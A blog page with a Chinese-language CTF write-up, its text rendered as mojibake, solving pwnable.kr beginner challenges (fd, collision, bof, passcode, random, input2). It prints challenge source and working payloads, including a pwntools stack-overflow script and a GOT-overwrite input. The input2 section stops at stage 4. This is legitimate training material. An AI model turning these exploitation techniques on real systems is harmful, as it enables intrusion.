



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="a1oyss" href="https://a1oyss.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="a1oyss" href="https://a1oyss.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="a1oyss" href="https://a1oyss.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="CTF,ç½‘ç»œå®‰å…¨,PWN" />


<link rel="canonical" href="https://a1oyss.github.io/2020/12/21012.html">



  <title>
Pwnableé¢˜è§£ - ç½‘ç»œå®‰å…¨ |
a1oyss's blog = a1oyss</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">Pwnableé¢˜è§£
  </h1>
  
<div class="meta">
  <span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2020-12-23 11:11:41">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">å‘è¡¨äº</span>
    <time itemprop="dateCreated datePublished" datetime="2020-12-23T11:11:41+08:00">2020-12-23</time>
  </span>
  <span class="item" title="æœ¬æ–‡å­—æ•°">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">æœ¬æ–‡å­—æ•°</span>
    <span>35k</span>
    <span class="text">å­—</span>
  </span>
  <span class="item" title="é˜…è¯»æ—¶é•¿">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">é˜…è¯»æ—¶é•¿</span>
    <span>32 åˆ†é’Ÿ</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">a1oyss's blog</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2024/10/13/Z5XKkwlpEWrNihC.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2024/10/13/PyzRCs6iEVNBw1S.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2024/10/13/DLBIpjvV6EhecJb.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2024/10/13/uyhMVC8iFk7L3oq.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2024/10/13/J5qtFM1iUxWlS9u.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2024/10/13/afoWh3p7szBujPK.png"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="åˆ†ç±»äº ç½‘ç»œå®‰å…¨"><span itemprop="name">ç½‘ç»œå®‰å…¨</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://a1oyss.github.io/2020/12/21012.html">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="a1oyss">
    <meta itemprop="description" content=", éšä¾¿å†™ç‚¹ä»€ä¹ˆ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="a1oyss">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>#CTF #PWN</p>
<h1 id="toddlers-bottle"><a class="anchor" href="#toddlers-bottle">#</a> Toddler's Bottle</h1>
<h2 id="fd"><a class="anchor" href="#fd">#</a> fd</h2>
<h3 id="é¢˜ç›®æè¿°"><a class="anchor" href="#é¢˜ç›®æè¿°">#</a> é¢˜ç›®æè¿°</h3>
<p>Mommy! what is a file descriptor in Linux?</p>
<ul>
<li>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:<br />
<span class="exturl" data-url="aHR0cHM6Ly95b3V0dS5iZS85NzFlWmhNSFFRdw==">https://youtu.be/971eZhMHQQw</span></li>
</ul>
<p>ssh <span class="exturl" data-url="bWFpbHRvOmZkQHB3bmFibGUua3I=">fd@pwnable.kr</span> -p2222 (pw:guest)</p>
<h3 id="é¢˜ç›®è§£æ"><a class="anchor" href="#é¢˜ç›®è§£æ">#</a> é¢˜ç›®è§£æ</h3>
<p>å…ˆäº†è§£ä¸‹ fd æ˜¯ä»€ä¹ˆä¸œè¥¿</p>
<p>fd (file descriptor)ï¼Œæ–‡ä»¶æè¿°ç¬¦</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODYlODUlRTYlQTAlQjgvMTA4NDEw">å†…æ ¸</span>ï¼ˆkernelï¼‰åˆ©ç”¨æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰æ¥è®¿é—®æ–‡ä»¶ã€‚æ–‡ä»¶æè¿°ç¬¦æ˜¯éè´Ÿæ•´æ•°ã€‚æ‰“å¼€ç°å­˜æ–‡ä»¶æˆ–æ–°å»ºæ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚è¯»å†™æ–‡ä»¶ä¹Ÿéœ€è¦ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ¥æŒ‡å®šå¾…è¯»å†™çš„æ–‡ä»¶ã€‚</p>
<p>ä¹ æƒ¯ä¸Šï¼Œæ ‡å‡†è¾“å…¥ï¼ˆstandard inputï¼‰çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯ 0ï¼Œæ ‡å‡†è¾“å‡ºï¼ˆstandard outputï¼‰æ˜¯ 1ï¼Œæ ‡å‡†é”™è¯¯ï¼ˆstandard errorï¼‰æ˜¯ 2ã€‚</p>
<p>ssh è¿æ¥ä¸Šé¢˜ç›®ï¼ŒæŸ¥çœ‹é¢˜ç›®ä»£ç </p>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
#include &lt;string.h&gt;<br />
char buf[32];<br />
int main(int argc, char* argv[], char* envp[]){<br />
if(argc&lt;2){<br />
printf(&quot;pass argv[1] a number\n&quot;);<br />
return 0;<br />
}<br />
int fd = atoi( argv[1] ) - 0x1234;<br />
int len = 0;<br />
len = read(fd, buf, 32);<br />
if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){<br />
printf(&quot;good job ğŸ˜ƒ\n&quot;);<br />
system(&quot;/bin/cat flag&quot;);<br />
exit(0);<br />
}<br />
printf(&quot;learn about Linux file IO\n&quot;);<br />
return 0;</p>
<p>}</p>
<p>ä»¤ fd ä¸º 0 (stdin)ï¼Œå†è¾“å…¥ LETMEWIN å°±å¯ä»¥å¾—åˆ° flagã€‚</p>
<p><strong>payload</strong></p>
<p>./fd 4660<br />
inputï¼šLETMEWIN</p>
<h2 id="collision"><a class="anchor" href="#collision">#</a> collision</h2>
<h3 id="é¢˜ç›®æè¿°-2"><a class="anchor" href="#é¢˜ç›®æè¿°-2">#</a> é¢˜ç›®æè¿°</h3>
<p>Daddy told me about cool MD5 hash collision today.</p>
<p>I wanna do something like that too!</p>
<p>ssh <span class="exturl" data-url="bWFpbHRvOmNvbEBwd25hYmxlLmty">col@pwnable.kr</span> -p2222 (pw:guest)</p>
<h3 id="é¢˜ç›®è§£æ-2"><a class="anchor" href="#é¢˜ç›®è§£æ-2">#</a> é¢˜ç›®è§£æ</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;string.h&gt;<br />
unsigned long hashcode = 0x21DD09EC;<br />
unsigned long check_password(const char* p){<br />
int* ip = (int*)p;<br />
int i;<br />
int res=0;<br />
for(i=0; i&lt;5; i++){<br />
res += ip[i];<br />
}<br />
return res;<br />
}</p>
<p>int main(int argc, char* argv[]){<br />
if(argc&lt;2){<br />
printf(&quot;usage:%s [passcode]\n&quot;, argv[0]);<br />
return 0;<br />
}<br />
if(strlen(argv[1]) != 20){<br />
printf(&quot;passcode length should be 20 bytes\n&quot;);<br />
return 0;<br />
}</p>
<pre><code>    if(hashcode == check_password( argv[1] ))&#123;
            system(&quot;/bin/cat flag&quot;);
            return 0;
    &#125;
    else
            printf(&quot;wrong passcode.\n&quot;);
    return 0;
</code></pre>
<p>}</p>
<p><code>check_password</code>  å°† <code>char*</code>  å¼ºåˆ¶è½¬æ¢ä¸º <code>int*</code> ï¼Œä¹Ÿå°±æ˜¯å°†è¾“å…¥çš„æ•°æ®åˆ†ä¸º 4 ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œ5 ç»„æ•°æ®ç›¸åŠ æœ€åçš„ç»“æœè¦ç­‰äº <code>0x21DD09EC</code></p>
<p><code>0x21DD09EC/5 = 0x6C5CEC9 * 4 + 0x6C5CEC8</code></p>
<p><strong>payload</strong></p>
<p>./col  <code>python -c 'print &quot;\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC9\xCE\xC5\x06\xC8\xCE\xC5\x06&quot;'</code></p>
<h2 id="bof"><a class="anchor" href="#bof">#</a> bof</h2>
<h3 id="é¢˜ç›®æè¿°-3"><a class="anchor" href="#é¢˜ç›®æè¿°-3">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;string.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
void func(int key){<br />
char overflowme[32];<br />
printf(&quot;overflow me:&quot;);<br />
gets(overflowme);	// smash me!<br />
if(key == 0xcafebabe){<br />
system(&quot;/bin/sh&quot;);<br />
}<br />
else{<br />
printf(&quot;Nah..\n&quot;);<br />
}<br />
}<br />
int main(int argc, char* argv[]){<br />
func(0xdeadbeef);<br />
return 0;<br />
}</p>
<h3 id="é¢˜ç›®è§£æ-3"><a class="anchor" href="#é¢˜ç›®è§£æ-3">#</a> é¢˜ç›®è§£æ</h3>
<p>å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå°† key çš„å€¼è¦†ç›–ä¸º <code>0xCAFEBABE</code>  å°±å¯ä»¥äº†</p>
<p><strong>payload</strong></p>
<p>from pwn import *<br />
context.log_level='debug'</p>
<p>p=remote(&quot;<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>&quot;,9000)<br />
#print p.recvline()<br />
payload='a'*52<br />
payload+=p64(0xCAFEBABE)<br />
p.sendline(payload)</p>
<p>p.interactive()</p>
<h2 id="flag"><a class="anchor" href="#flag">#</a> flag</h2>
<h3 id="é¢˜ç›®æè¿°-4"><a class="anchor" href="#é¢˜ç›®æè¿°-4">#</a> é¢˜ç›®æè¿°</h3>
<p>è™½ç„¶åœ¨ pwnable ä¸Šé¢ï¼Œä½†æ˜¯æ˜¯ä¸€é“é€†å‘é¢˜</p>
<p>Papa brought me a packed present! let's open it.</p>
<p>Download:<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3IvYmluL2ZsYWc=">http://pwnable.kr/bin/flag</span></p>
<p>This is reversing task. all you need is binary</p>
<h3 id="é¢˜ç›®è§£æ-4"><a class="anchor" href="#é¢˜ç›®è§£æ-4">#</a> é¢˜ç›®è§£æ</h3>
<p>åˆšæ‹¿åˆ°å°±ç›´æ¥æ”¾è¿›äº† ida ä¸­ï¼Œç»“æœåªæ˜¾ç¤º 4 ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”æœ‰çš„è¿˜æ— æ³• F5ã€‚åæ¥çœ‹äº† wp æ‰çŸ¥é“ç¨‹åºè¢« upx å‹ç¼©è¿‡äº†</p>
<p><code>upx -d flag</code>  è§£å‹ç¼©ï¼Œida åˆ†æç¨‹åº</p>
<p>int __cdecl main(int argc, const char **argv, const char **envp)<br />
{<br />
char *dest; // ST08_8</p>
<p>puts((__int64)&quot;I will malloc() and strcpy the flag there. take it.&quot;);<br />
dest = (char *)malloc(100LL);<br />
strcpy(dest, flag);<br />
return 0;<br />
}</p>
<p>éå¸¸ç®€å•çš„é€»è¾‘ï¼ŒæŠŠ flag å¤åˆ¶åˆ° dest ä¸­ï¼ŒæŸ¥çœ‹ flag å¤„çš„æ•°æ®å³å¯</p>
<h2 id="passcode"><a class="anchor" href="#passcode">#</a> passcode</h2>
<h3 id="é¢˜ç›®æè¿°-5"><a class="anchor" href="#é¢˜ç›®æè¿°-5">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;stdlib.h&gt;</p>
<p>void login(){<br />
int passcode1;<br />
int passcode2;</p>
<pre><code>    printf(&quot;enter passcode1:&quot;);
    scanf(&quot;%d&quot;, passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf(&quot;enter passcode2:&quot;);
    scanf(&quot;%d&quot;, passcode2);

    printf(&quot;checking...\n&quot;);
    if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;
            printf(&quot;Login OK!\n&quot;);
            system(&quot;/bin/cat flag&quot;);
    &#125;
    else&#123;
            printf(&quot;Login Failed!\n&quot;);
            exit(0);
    &#125;
</code></pre>
<p>}</p>
<p>void welcome(){<br />
char name[100];<br />
printf(&quot;enter you name:&quot;);<br />
scanf(&quot;%100s&quot;, name);<br />
printf(&quot;Welcome %s!\n&quot;, name);<br />
}</p>
<p>int main(){<br />
printf(&quot;Toddler's Secure Login System 1.0 beta.\n&quot;);</p>
<pre><code>    welcome();
    login();

    // something after login...
    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
    return 0;
</code></pre>
<p>}</p>
<h3 id="é¢˜ç›®è§£æ-5"><a class="anchor" href="#é¢˜ç›®è§£æ-5">#</a> é¢˜ç›®è§£æ</h3>
<p>login å‡½æ•°ä¸­çš„ä¸¤ä¸ª scanf çš„å‚æ•°æ²¡æœ‰åŠ  &amp;ï¼Œä½†æ˜¯ scanf ä¾ç„¶ä¼šæŠŠ passcode1 å’Œ passcode2 å½“æˆæŒ‡é’ˆæ¥å­˜å‚¨æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶è¾“å…¥çš„æ•°æ®åº”è¯¥åœ¨ passcode1 å’Œ passcode2 ä¸­çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€é‡Œé¢ã€‚</p>
<p>å¦‚æœå°† passcode1 æˆ– passcode2 é‡Œé¢çš„å€¼è¦†ç›–ä¸ºæŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œæ„é€ å¥½æ ˆçš„å¸ƒå±€ï¼Œå‚æ•°ä¸º <code>system(&quot;/bin/cat flag&quot;)</code>  çš„åœ°å€ï¼Œé‚£ä¹ˆ scanf å°±ä¼šå°† <code>system(&quot;/bin/cat flag&quot;)</code>  çš„åœ°å€è¦†ç›–åˆ°åŸæœ¬çš„å‡½æ•°åœ°å€ä¸Šå»ï¼Œç„¶åå¾—åˆ° flagã€‚</p>
<p>æ¥ä¸‹æ¥å°±éœ€è¦è®¡ç®— name åˆ° passcode çš„é•¿åº¦</p>
<p>gdb åæ±‡ç¼–åˆ†æï¼Œåªçœ‹å…³é”®éƒ¨åˆ†</p>
<p>welcome:<br />
0x0804862f &lt;+38&gt;:    lea    -0x70 (% ebp),% edx	;name çš„åœ°å€<br />
 0x08048632 &lt;+41&gt;:    mov    % edx,0x4 (% esp)<br />
0x08048636 &lt;+45&gt;:    mov    %eax,(%esp)<br />
0x08048639 &lt;+48&gt;:    call   0x80484a0 <span class="exturl" data-url="bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==">__isoc99_scanf@plt</span></p>
<p>login:<br />
passcode1:<br />
0x0804857c &lt;+24&gt;:    mov    -0x10 (% ebp),% edx	;passcode1 çš„åœ°å€<br />
 0x0804857f &lt;+27&gt;:    mov    % edx,0x4 (% esp)<br />
0x08048583 &lt;+31&gt;:    mov    %eax,(%esp)<br />
0x08048586 &lt;+34&gt;:    call   0x80484a0 <span class="exturl" data-url="bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==">__isoc99_scanf@plt</span><br />
passcode2:<br />
0x080485aa &lt;+70&gt;:    mov    -0xc (% ebp),% edx	;passcode2 çš„åœ°å€<br />
 0x080485ad &lt;+73&gt;:    mov    % edx,0x4 (% esp)<br />
0x080485b1 &lt;+77&gt;:    mov    %eax,(%esp)<br />
0x080485b4 &lt;+80&gt;:    call   0x80484a0 <span class="exturl" data-url="bWFpbHRvOl9faXNvYzk5X3NjYW5mQHBsdA==">__isoc99_scanf@plt</span><br />
system_getflag:<br />
0x080485e3 &lt;+127&gt;:   movl   $0x80487af,(%esp)<br />
0x080485ea &lt;+134&gt;:   call   0x8048460 <span class="exturl" data-url="bWFpbHRvOnN5c3RlbUBwbHQ=">system@plt</span></p>
<p>é€šè¿‡è®¡ç®—å¯çŸ¥ï¼Œname åˆ° passcode1 çš„é•¿åº¦ä¸º 96 å­—èŠ‚ï¼Œname çš„é•¿åº¦ä¸º 100ï¼Œåˆšå¥½å¯ä»¥æº¢å‡ºè¦†ç›– passcode1ã€‚</p>
<p>æ¥ç€æŸ¥çœ‹ plt è¡¨ï¼Œå› ä¸ºåªå¤Ÿè¦†ç›–åˆ° passcode1ï¼Œæ‰€ä»¥é€‰æ‹© fflush å‡½æ•°</p>
<p><strong>payload</strong></p>
<p>python -c &quot;print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'&quot; | ./passcode</p>
<h2 id="random"><a class="anchor" href="#random">#</a> random</h2>
<h3 id="é¢˜ç›®æè¿°-6"><a class="anchor" href="#é¢˜ç›®æè¿°-6">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;</p>
<p>int main(){<br />
unsigned int random;<br />
random = rand();	// random value!</p>
<pre><code>unsigned int key=0;
scanf(&quot;%d&quot;, &amp;key);

if( (key ^ random) == 0xdeadbeef )&#123;
	printf(&quot;Good!\n&quot;);
	system(&quot;/bin/cat flag&quot;);
	return 0;
&#125;

printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);
return 0;
</code></pre>
<p>}</p>
<h3 id="é¢˜ç›®è§£æ-6"><a class="anchor" href="#é¢˜ç›®è§£æ-6">#</a> é¢˜ç›®è§£æ</h3>
<p>è§‚å¯Ÿä»£ç ï¼Œä»¤ <code>key^random</code>  çš„å€¼ç­‰äº <code>0xdeadbeef</code>  å°±å¯ä»¥å¾—åˆ° flagã€‚åˆšå¼€å§‹ä»¥ä¸ºæ˜¯æ ˆæº¢å‡ºï¼Œä½†æ˜¯ <code>scanf(&quot;%d&quot;,&amp;key)</code>  åªä¼šè¯»å– 4 ä¸ªå­—èŠ‚ï¼Œä¸å¤Ÿè¦†ç›– randomã€‚</p>
<p>è°ƒè¯•äº†å‡ æ¬¡å‘ç° random æ¯æ¬¡çš„å€¼éƒ½ä¸€æ ·ï¼Œé‚£ä¹ˆåªéœ€è¦å°† <code>0xdeadbeef</code>  ä¸ random å¼‚æˆ–å°±å¯ä»¥å¾—åˆ° key çš„å€¼ï¼Œæœ€åè¾“å…¥ key çš„æ—¶å€™è¦å…ˆæŠŠ key è½¬ä¸º 10 è¿›åˆ¶ï¼Œå› ä¸º scanf çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ % dã€‚</p>
<p>å…³äºä¸ºä»€ä¹ˆ random æ¯æ¬¡çš„å€¼éƒ½ä¸€æ ·</p>
<p>rand<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODclQkQlRTYlOTUlQjA="> å‡½æ•°</span>ä¸æ˜¯çœŸæ­£çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼Œè€Œ srand () ä¼šè®¾ç½®ä¾› rand () ä½¿ç”¨çš„éšæœºæ•°ç§å­ã€‚å¦‚æœä½ åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨ rand () ä¹‹å‰æ²¡æœ‰è°ƒç”¨ srand ()ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šä¸ºä½ è‡ªåŠ¨è°ƒç”¨ srand ()ã€‚å¦‚æœç”¨æˆ·åœ¨æ­¤ä¹‹å‰æ²¡æœ‰è°ƒç”¨è¿‡ srand (seed)ï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨ srand (1) ä¸€æ¬¡ã€‚è€Œä½¿ç”¨åŒç§å­ç›¸åŒçš„æ•°è°ƒç”¨ rand () ä¼šå¯¼è‡´ç›¸åŒçš„<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOUElOEYlRTYlOUMlQkE=">éšæœº</span>æ•°åºåˆ—è¢«ç”Ÿæˆã€‚</p>
<h2 id="input2"><a class="anchor" href="#input2">#</a> input2</h2>
<h3 id="é¢˜ç›®æè¿°-7"><a class="anchor" href="#é¢˜ç›®æè¿°-7">#</a> é¢˜ç›®æè¿°</h3>
<p>#include &lt;stdio.h&gt;<br />
#include &lt;stdlib.h&gt;<br />
#include &lt;string.h&gt;<br />
#include &lt;sys/socket.h&gt;<br />
#include &lt;arpa/inet.h&gt;</p>
<p>int main(int argc, char* argv[], char* envp[]){<br />
printf(&quot;Welcome to <span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>\n&quot;);<br />
printf(&quot;Let's see if you know how to give input to program\n&quot;);<br />
printf(&quot;Just give me correct inputs then you will get the flag ğŸ˜ƒ\n&quot;);</p>
<pre><code>// argv
if(argc != 100) return 0;
if(strcmp(argv['A'],&quot;\x00&quot;)) return 0;
if(strcmp(argv['B'],&quot;\x20\x0a\x0d&quot;)) return 0;
printf(&quot;Stage 1 clear!\n&quot;);	

// stdio
char buf[4];
read(0, buf, 4);
if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;
read(2, buf, 4);
    if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;
printf(&quot;Stage 2 clear!\n&quot;);

// env
if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;
printf(&quot;Stage 3 clear!\n&quot;);

// file
FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);
if(!fp) return 0;
if( fread(buf, 4, 1, fp)!=1 ) return 0;
if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;
fclose(fp);
printf(&quot;Stage 4 clear!\n&quot;);	

// network
int sd, cd;
struct sockaddr_in saddr, caddr;
sd = socket(AF_INET, SOCK_STREAM, 0);
if(sd == -1)&#123;
	printf(&quot;socket error, tell admin\n&quot;);
	return 0;
&#125;
saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = INADDR_ANY;
saddr.sin_port = htons( atoi(argv['C']) );
if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;
	printf(&quot;bind error, use another port\n&quot;);
		return 1;
&#125;
listen(sd, 1);
int c = sizeof(struct sockaddr_in);
cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);
if(cd &lt; 0)&#123;
	printf(&quot;accept error, tell admin\n&quot;);
	return 0;
&#125;
if( recv(cd, buf, 4, 0) != 4 ) return 0;
if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;
printf(&quot;Stage 5 clear!\n&quot;);

// here's your flag
system(&quot;/bin/cat flag&quot;);	
return 0;
</code></pre>
<p>}</p>
<p>é¢˜ç›®æ€»å…±æœ‰äº”å…³ï¼Œéœ€è¦ä¾æ¬¡é€šè¿‡ï¼Œpwntools å®Œç¾è§£å†³ã€‚</p>
<h3 id="é¢˜ç›®è§£æ-7"><a class="anchor" href="#é¢˜ç›®è§£æ-7">#</a> é¢˜ç›®è§£æ</h3>
<h4 id="stage-1-argv"><a class="anchor" href="#stage-1-argv">#</a> stage 1 argv</h4>
<p>if(argc != 100) return 0;<br />
if(strcmp(argv['A'],&quot;\x00&quot;)) return 0;<br />
if(strcmp(argv['B'],&quot;\x20\x0a\x0d&quot;)) return 0;<br />
printf(&quot;Stage 1 clear!\n&quot;);</p>
<p>ç¬¬ä¸€å…³è¦æ±‚ç»™å‡º 100 ä¸ªå‚æ•°ï¼Œå¹¶ä¸”ç¬¬â€™A'ï¼ˆ65ï¼‰ä¸ªå’Œç¬¬ 'B'ï¼ˆ66ï¼‰ä¸ªåˆ†åˆ«æ˜¯ <code>\x00</code>  å’Œ <code>\x20\x0a\x0d</code> ã€‚</p>
<p>æ„é€  listï¼Œä¸€èˆ¬æƒ…å†µï¼Œargv [0] æ˜¯ <code>&quot;./input&quot;</code> ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºå</p>
<p>argv = list('1' * 100)<br />
argv[0] = &quot;./input&quot;<br />
argv[ord('A')] = &quot;\x00&quot;<br />
argv[ord('B')] = &quot;\x20\x0a\x0d&quot;</p>
<h4 id="stage-2-stdio"><a class="anchor" href="#stage-2-stdio">#</a> stage 2 stdio</h4>
<p>char buf[4];<br />
read(0, buf, 4);<br />
if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;<br />
read(2, buf, 4);<br />
if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;<br />
printf(&quot;Stage 2 clear!\n&quot;);</p>
<p>ç¬¬ä¸€ä¸ª <code>memcmp</code>  ä» stdin ä¸­è¯»å–æ•°æ®ï¼Œä¸ <code>\x00\x0a\x00\xff</code>  è¿›è¡Œå¯¹æ¯”ï¼Œç¬¬äºŒä¸ª <code>memcmp</code>  ä» stderr ä¸­è¯»å–æ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p>
<p>pwntools ä¸­çš„ process æœ‰ 2 ä¸ªå‚æ•°ï¼Œstdin å’Œ stderrï¼Œä¼ å…¥æ–‡ä»¶å¯¹è±¡å³å¯ã€‚</p>
<p>with open(&quot;stdin.txt&quot;, &quot;wb&quot;) as file:<br />
file.write(&quot;\x00\x0a\x00\xff&quot;)<br />
file.close()<br />
with open(&quot;stderr.txt&quot;, &quot;wb&quot;) as file:<br />
file.write(&quot;\x00\x0a\x02\xff&quot;)<br />
file.close()</p>
<h4 id="stage-3-env"><a class="anchor" href="#stage-3-env">#</a> stage 3 env</h4>
<p>if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;<br />
printf(&quot;Stage 3 clear!\n&quot;);</p>
<p>ä¾æ—§ä½¿ç”¨ process ä¸­çš„ env å‚æ•°ï¼Œenv æ˜¯å­—å…¸å½¢å¼ã€‚</p>
<p \xde\xad\xbe\xef:\xca\xfe\xba\xbe="">env =</p>
<h4 id="stage-4-file"><a class="anchor" href="#stage-4-file">#</a> stage 4 file</h4>
<p>FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);<br />
if(!fp) return 0;<br />
if( fread(buf, 4, 1, fp)!=1 ) return 0;<br />
if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;<br />
fclose(fp);<br />
printf(&quot;Stage 4 clear!\n&quot;);</p>
